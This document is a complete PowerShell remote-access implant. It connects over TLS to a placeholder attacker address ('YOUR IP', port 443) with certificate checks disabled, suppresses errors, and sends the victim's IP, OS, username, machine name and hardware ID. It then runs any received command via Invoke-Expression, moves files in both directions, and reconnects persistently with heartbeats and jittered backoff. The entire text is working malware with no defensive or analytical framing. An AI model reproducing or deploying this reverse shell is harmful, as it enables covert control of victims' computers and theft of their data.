$ErrorActionPreference="SilentlyContinue";$s="YOUR IP";$p=443;$rd=5;$mrd=300;$ra=0;$hi=30
function H2B($h){if(!$h){return @()};try{$b=New-Object byte[]($h.Length/2);for($i=0;$i -lt $h.Length;$i+=2){$b[$i/2]=[Convert]::ToByte($h.Substring($i,2),16)};return $b}catch{return @()}}
function B2H($b){if(!$b){return ""};try{return($b|%{ $_.ToString("X2") })-join""}catch{return""}}
function Get-SystemInfo{
$o=(Get-CimInstance Win32_OperatingSystem).Caption;$u="$env:USERNAME@$env:COMPUTERNAME"
try{$i=(Invoke-RestMethod -Uri "https://api.ipify.org" -TimeoutSec 5)}catch{$i=(Get-NetIPAddress|?{$_.AddressFamily -eq 'IPv4' -and $_.IPAddress -ne '127.0.0.1'}|Select -F 1).IPAddress}
$h=(Get-CimInstance Win32_ComputerSystemProduct).UUID;@{IP=$i;OS=$o;UserMachine=$u;HWID=$h}|ConvertTo-Json -Compress
}
function Connect-ToServer{
$c=New-Object Net.Sockets.TcpClient;$c.Client.SetSocketOption([Net.Sockets.SocketOptionLevel]::Socket,[Net.Sockets.SocketOptionName]::KeepAlive,$true)
$c.Connect($s,$p);$st=New-Object Net.Security.SslStream($c.GetStream(),$false,{$true});$st.AuthenticateAsClient($s);$st.ReadTimeout=300000
$w=New-Object System.IO.StreamWriter($st);$w.AutoFlush=$true;$r=New-Object System.IO.StreamReader($st)
return @{Client=$c;Writer=$w;Reader=$r;Stream=$st}
}
function Invoke-NativeCommand{
param($Command)
try{if(-not $Command -or $Command.Trim() -eq ""){return $null};$o=Invoke-Expression $Command 2>&1;if($o){return $o|Out-String -Width 200};return $null}catch{return "ERROR: $($_.Exception.Message)"}
}
function Process-Commands($w,$r,$st){
$up=$false;$upPath="";$upBuf="";$w.WriteLine("INFO:$(Get-SystemInfo)")
while($true){
try{
$l=$r.ReadLine();if($null -eq $l){break}
if($l -eq "heartbeat"){$w.WriteLine("heartbeat");continue}
if($up){
if($l -eq "__end__"){
try{[IO.File]::WriteAllBytes($upPath,(H2B $upBuf));$w.WriteLine("__end__")}catch{$w.WriteLine("ERROR: Upload failed - $($_.Exception.Message)");$w.WriteLine("__end__")}
$up=$false;$upBuf="";$upPath=""
}else{$upBuf+=$l}
continue
}
if($l -match "^exit$"){$w.WriteLine("__end__");break}
if($l -match "^__upload__:(.+)$"){$upPath=$matches[1];$upBuf="";$up=$true;continue}
if($l -match "^download\s+(.+)$"){
$fp=$matches[1];if(-not(Test-Path $fp)){$w.WriteLine("ERROR: File not found");$w.WriteLine("__end__");continue}
try{$fs=[IO.File]::OpenRead($fp);$bs=New-Object byte[] 8192;while(($rd=$fs.Read($bs,0,8192)) -gt 0){$w.WriteLine((B2H $bs[0..($rd-1)]))};$fs.Close();$w.WriteLine("__end__")}catch{$w.WriteLine("ERROR: Download failed - $($_.Exception.Message)");$w.WriteLine("__end__")}
continue
}
$res=Invoke-NativeCommand -Command $l
if($res){
foreach($line in ($res-split"`r?`n")){
if($line.Trim()){
if($line.Length -gt 4000){
for($i=0;$i -lt $line.Length;$i+=4000){$w.WriteLine($line.Substring($i,[Math]::Min(4000,$line.Length-$i)))}
}else{$w.WriteLine($line)}
}
}
}
$w.WriteLine("__end__")
}catch{
if($_.FullyQualifiedErrorId -match "IOException" -or $_.Exception -is [System.IO.IOException]){
break
}else{
try{$w.WriteLine("ERROR: $($_.Exception.Message)");$w.WriteLine("__end__")}catch{break}
}
}
}
}
while($true){
try{
$cn=Connect-ToServer;$ra=0;$rd=5
$hb=Start-Job -ScriptBlock{param($w)while($true){Start-Sleep -Seconds 30;try{$w.WriteLine("heartbeat")}catch{break}}} -ArgumentList $cn.Writer
Process-Commands $cn.Writer $cn.Reader $cn.Stream
$cn.Client.Close();Stop-Job $hb -EA SilentlyContinue;Remove-Job $hb -EA SilentlyContinue;Start-Sleep -Seconds 5
}catch{
$ra++;$bd=[Math]::Min($rd*$ra,$mrd);$jt=Get-Random -Minimum 1 -Maximum 15;Start-Sleep -Seconds ($bd+$jt)
}
}
